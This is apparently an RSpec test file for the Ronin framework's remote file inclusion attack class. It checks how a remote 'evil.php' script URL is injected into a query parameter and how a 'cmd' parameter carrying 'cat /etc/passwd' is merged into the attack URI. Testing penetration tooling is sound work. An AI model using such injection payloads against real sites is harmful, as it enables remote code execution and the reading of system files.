require 'spec_helper'
require 'ronin/attacks/rfi'

describe Attacks::RFI do
  let(:query_param)   { 'q' }
  let(:original_data) { 'foo' }

  let(:uri)         { URI("http://www.example.com/page.php?#{query_param}=#{original_data}") }
  let(:url)         { URL.from(uri) }

  let(:script)      { 'http://www.example.com/evil.php?q=1' }

  let(:attack) do
    described_class.new(
      :url           => url,
      :query_param   => query_param,
      :original_data => original_data,
      :terminate     => true
    )
  end
  subject { attack }

  describe "TEST_SCRIPTS" do
    subject { described_class::TEST_SCRIPTS }

    it "should not be empty" do
      subject.should_not be_empty
    end

    it "should be publically accessible" do
      subject.values.should be_all do |uri|
        Net::HTTP.get_response(uri).code.should == '200'
      end
    end
  end

  describe "script_language" do
    it "should infer the language from the URL path-extension" do
      subject.script_language.should == 'php'
    end

    it "should only allow known languages" do
      new_attack = described_class.new(:url => url, :script_language => 'foo')

      new_attack.should_not be_valid
    end
  end

  describe "#inject" do
    it "should inject the script" do
      subject.inject(script).should be_start_with(script)
    end

    it "should allow terminating the script URI with a '?'" do
      subject.inject(script).should be_end_with('?')
    end
  end

  describe "#attack_uri" do
    let(:param_name)  { 'cmd' }
    let(:param_value) { 'cat /etc/passwd' }

    subject { attack.attack_uri(script, param_name => param_value) }

    it "should merge any additional query params into the attack URI" do
      subject.query_params[param_name].should == param_value
    end
  end
end
